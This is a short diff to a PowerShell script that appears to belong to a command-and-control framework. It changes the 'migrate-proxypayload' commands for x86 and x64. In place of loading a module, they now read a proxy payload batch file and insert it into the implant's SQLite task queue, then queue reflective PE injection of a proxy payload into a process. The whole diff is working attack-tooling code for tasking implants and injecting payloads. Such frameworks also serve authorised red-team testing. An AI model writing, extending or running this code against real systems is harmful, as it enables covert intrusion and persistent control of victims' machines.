@@ -1332,7 +1332,13 @@ param
             { 
                 if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                 CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
-                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
+                $proxypayload = gc "$FolderPath\payloads\proxypayload.bat"     
+                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "`$proxypayload = `"$proxypayload`""
+                } | Out-Null
+                           
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
                 $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
@@ -1345,7 +1351,12 @@ param
             { 
                 if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                 CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
-                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
+                $proxypayload = gc "$FolderPath\payloads\proxypayload.bat" 
+                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = "`$proxypayload = `"$proxypayload`""
+                } | Out-Null
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
                 $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
